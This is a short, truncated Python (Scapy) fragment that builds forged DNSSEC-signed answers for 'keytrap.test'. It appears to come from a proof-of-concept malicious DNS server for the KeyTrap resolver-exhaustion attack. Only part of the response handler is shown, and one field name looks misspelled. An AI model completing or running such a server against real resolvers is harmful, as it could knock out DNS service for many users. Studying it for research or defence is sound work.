...
def handle_A_query(pkt):
    ...
    if qname in ["www.keytrap.test.", "keytrap.test.", "ns1.keytrap.test."]:
        spf_dns = DNS(id=pkt[DNS].id, qr=1, qd=pkt[DNS].qd,
                        ancount=2, an=[
                            DNSRR(rrname=qname, type=1, ttl=10, rdata="1.2.3.4"),
                            DNSRRRSIG(rrname=qname, keytag=6350, signersname="keytrap.test", signature=RRSIG[qname]),
                        ],
                        nscount=2, ns=[
                            DNSRR(rrname="keytrap.test.", type=2, ttl=60, rdata="ns1.keytrap.test."),
                            DNSRRRSIG(rrname="keytrap.test.", keytag=6350, typecoverred=2, signersname="keytrap.test", signature=RRSIG["keytrap.test."]),
                        ],
                        arcount=2, ar=[
